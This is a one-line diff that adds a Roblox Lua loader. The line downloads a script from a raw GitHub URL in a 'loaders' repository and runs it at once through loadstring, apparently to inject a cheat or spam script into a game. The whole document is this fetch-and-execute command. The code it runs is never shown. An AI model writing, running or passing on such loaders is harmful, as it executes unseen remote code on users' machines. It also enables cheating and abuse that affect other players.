@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/the-hollow-spam7-7s1yxo4xmciq0c.lua"))()
